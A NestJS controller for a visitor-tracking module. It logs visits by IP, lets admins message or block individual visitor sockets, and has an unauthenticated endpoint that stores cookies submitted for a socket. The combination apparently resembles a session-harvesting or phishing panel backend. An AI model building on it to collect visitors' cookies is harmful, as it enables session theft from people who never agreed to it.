import { AdminGuard } from "@/auth/guards/admin.guard";
import { firstForwardedIp, normalizeIp } from "@/common/http-ip.utils";
import {
  BadRequestException,
  Body,
  Controller,
  Get,
  HttpCode,
  HttpStatus,
  Param,
  Post,
  Query,
  Req,
  Res,
  UseGuards,
} from "@nestjs/common";
import { ApiBearerAuth, ApiOperation, ApiTags } from "@nestjs/swagger";
import { Throttle } from "@nestjs/throttler";
import { Request, Response } from "express";
import { GetVisitsQuery } from "./dto/get-visits.query";
import { SaveCookiesDto } from "./dto/save-cookies.dto";
import { SendMessageByIpDto } from "./dto/send-message-by-ip.dto";
import { SendMessageBySocketDto } from "./dto/send-message-by-socket.dto";
import { TrackVisitDto } from "./dto/track-visit.dto";
import { EventsGateway } from "./events.gateway";
import { VisitsService } from "./visits.service";

function ok<T>(data: T) {
  return { success: true, data };
}

@ApiTags("Visits")
@Controller("visits")
export class VisitsController {
  constructor(
    private readonly visitsService: VisitsService,
    private readonly eventsGateway: EventsGateway
  ) {}

  @ApiOperation({ summary: "Трекинг визита (публично)" })
  @Throttle({ default: { limit: 5, ttl: 10 } })
  @Post()
  @HttpCode(HttpStatus.OK)
  async track(@Req() req: Request, @Body() body: TrackVisitDto) {
    const forwarded = firstForwardedIp(req.headers["x-forwarded-for"] as any);
    const rawIp = forwarded || req.socket.remoteAddress || "Unknown";
    const ip = normalizeIp(rawIp);
    const userAgent =
      body.userAgent || (req.headers["user-agent"] as string) || "Unknown";
    await this.visitsService.trackVisit({ ...body, ip, userAgent });
    return ok({ message: "Visit tracked", ip });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Get()
  @ApiOperation({ summary: "Список визитов с фильтрами и пагинацией (cursor)" })
  async getAll(@Query() q: GetVisitsQuery) {
    const { items, nextCursor } = await this.visitsService.findMany(q);
    return ok({ items, nextCursor });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Get("export.csv")
  @ApiOperation({ summary: "Экспорт CSV (учитывает те же фильтры)" })
  async export(@Query() q: GetVisitsQuery, @Res() res: Response) {
    const csv = await this.visitsService.exportCsv(q);
    res.setHeader("Content-Type", "text/csv; charset=utf-8");
    res.setHeader("Content-Disposition", 'attachment; filename="visits.csv"');
    res.send(csv);
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Get("by-socket/:socketId")
  async getBySocket(@Param("socketId") socketId: string) {
    const item = await this.visitsService.getBySocketId(socketId);
    return ok(item);
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("message")
  @HttpCode(HttpStatus.OK)
  async sendMessage(@Body() body: SendMessageBySocketDto) {
    const { socketId, message, type = "text" } = body;
    if (type === "set-block" && !["true", "false"].includes(message)) {
      throw new BadRequestException(
        "For type 'set-block' message must be 'true' or 'false'"
      );
    }
    await this.eventsGateway.sendMessageToSocketId(socketId, message, type);
    return ok({ message: `Sent to socket ${socketId}`, type });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("message-by-ip")
  @HttpCode(HttpStatus.OK)
  async sendMessageByIp(@Body() body: SendMessageByIpDto) {
    const { ip, message, type = "text" } = body;
    if (type === "set-block" && !["true", "false"].includes(message)) {
      throw new BadRequestException(
        "For type 'set-block' message must be 'true' or 'false'"
      );
    }
    this.eventsGateway.sendMessageToIp(ip, message, type);
    return ok({ message: `Sent to IP ${ip}`, type });
  }

  @Post("cookies")
  @HttpCode(HttpStatus.OK)
  async saveCookies(@Body() body: SaveCookiesDto) {
    await this.visitsService.saveCookies(body.socketId, body.cookies);
    return ok({ message: "Cookies saved" });
  }
}
